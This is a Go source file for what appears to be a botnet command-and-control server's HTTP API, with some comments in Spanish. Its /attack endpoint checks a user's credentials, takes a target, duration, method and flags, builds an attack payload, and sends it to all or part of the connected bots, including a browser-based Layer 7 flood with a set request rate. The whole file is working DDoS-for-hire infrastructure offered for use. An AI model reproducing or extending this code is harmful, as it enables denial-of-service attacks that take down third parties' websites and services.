package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/gorilla/mux"
)

// NewAPI will create the new API server.
func NewAPI() {
	mux := mux.NewRouter()
	mux.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		type Result struct {
			Success  bool              `json:"success"`
			Error    string            `json:"error"`
			Target   string            `json:"target"`
			Duration string            `json:"duration"`
			Method   string            `json:"method"`
			Flags    map[string]string `json:"flags"`
		}

		// Checks for missing parameters needed
		if r.URL.Query().Get("user") == "" || r.URL.Query().Get("password") == "" || r.URL.Query().Get("target") == "" || r.URL.Query().Get("duration") == "" || r.URL.Query().Get("method") == "" {
			w.WriteHeader(http.StatusBadRequest)
			response, err := json.Marshal(&Result{Success: false, Error: "missing required parameters"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		}

		// FindUser will return the user from the database if it was found
		user, err := FindUser(r.URL.Query().Get("user"))
		if err != nil || user == nil {
			w.WriteHeader(http.StatusUnauthorized)
			response, err := json.Marshal(&Result{Success: false, Error: "Unknown username"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		} else if user.Password != r.URL.Query().Get("password") {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "Unknown password for that user"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		} else if !user.API {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "You don't have API access"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		}

		if r.URL.Query().Get("method") == "!browser" {
			url := r.URL.Query().Get("target")
			durationStr := r.URL.Query().Get("duration")
			rateStr := r.URL.Query().Get("rate")
			if url == "" || durationStr == "" || rateStr == "" {
				json.NewEncoder(w).Encode(&Result{Success: false, Error: "Missing parameters: target, duration, rate"})
				return
			}
			args := []string{url, durationStr, rateStr}
			attack, err := ParseL7Attack("browser", args, user)
			if err != nil {
				json.NewEncoder(w).Encode(&Result{Success: false, Error: err.Error()})
				return
			}
			SendL7Attack(attack)
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(&Result{
				Success:  true,
				Target:   attack.URL,
				Duration: strconv.Itoa(attack.Duration),
				Method:   "!browser",
				Flags:    map[string]string{"rate": strconv.Itoa(attack.Rate)},
			})
			return
		}

		method, ok := IsMethod(r.URL.Query().Get("method"))
		if !ok || method == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: "Unknown method presented"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		}

		// Prepares the flags
		flags := make([]string, 0)
		pretty := make(map[string]string)
		for key, item := range r.URL.Query() {
			if _, ok := Flags[key]; !ok || key == "method" {
				continue
			}
			pretty[key] = strings.Join(item, " ")
			flags = append(flags, key+"="+strings.Join(item, ""))
		}

		// Calcular cuántos bots usar según el máximo global
		totalBots := len(Clients)
		maxOngoing := Options.Templates.Attacks.MaximumOngoing
		botsToUse := totalBots
		if maxOngoing > 1 {
			botsToUse = totalBots / maxOngoing
			if botsToUse < 1 {
				botsToUse = 1
			}
		}

		attack, err := method.Parse(append([]string{r.URL.Query().Get("method"), r.URL.Query().Get("target"), r.URL.Query().Get("duration")}, flags...), user, botsToUse)
		if err != nil || attack == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		}

		payload, err := attack.Bytes()
		if err != nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Write(response)
			return
		}

		// Enviar a los bots según la fracción calculada (no a todos)
		if botsToUse >= totalBots {
			BroadcastClients(payload)
		} else {
			BroadcastClientsFraction(payload, botsToUse)
		}

		// Respuesta exitosa
		w.WriteHeader(http.StatusOK)
		response, err := json.Marshal(&Result{Success: true, Target: r.URL.Query().Get("target"), Duration: r.URL.Query().Get("duration"), Method: r.URL.Query().Get("method"), Flags: pretty})
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		w.Write(response)
	})

	// Iniciar servidor API
	switch Options.Templates.API.TLS {
	case true:
		http.ListenAndServeTLS(Options.Templates.API.Listener, Options.Templates.API.Cert, Options.Templates.API.Key, mux)
	default:
		http.ListenAndServe(Options.Templates.API.Listener, mux)
	}
}
